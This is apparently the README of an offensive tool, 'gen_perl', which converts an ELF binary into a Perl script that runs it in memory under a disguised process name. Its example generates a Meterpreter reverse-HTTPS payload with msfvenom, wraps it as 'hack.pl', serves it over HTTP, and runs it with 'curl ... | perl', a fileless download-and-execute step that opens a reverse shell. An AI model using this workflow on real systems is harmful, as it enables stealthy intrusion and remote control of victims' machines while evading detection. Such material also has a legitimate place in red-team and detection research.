# gen_perl

A script to generate perl script for execute ELF in memory.

## Usage
```
git clone https://github.com/purpleroc/gen_perl
cd gen_perl
chmod +x gen_perl.sh
./gen_perl.sh elf_file perl_script.pl process_name
```

## Example
```
# generate reverse_https elf
msfvenom -p linux/x64/meterpreter_reverse_https LHOST=127.0.0.1 LPORT=8443 -f elf -o reverse_https
# convert elf to hack.pl
./gen_perl.sh reverse_https hack.pl hello_hacker
# start http server
python -m SimpleHTTPServer 8080
# execute hack.pl
curl http://127.0.0.1:8080/hack.pl | perl
```

### meterpreter
![](./png/msf.png)

### server
> process info
![](./png/ps.png)

> file info
![](./png/file.png)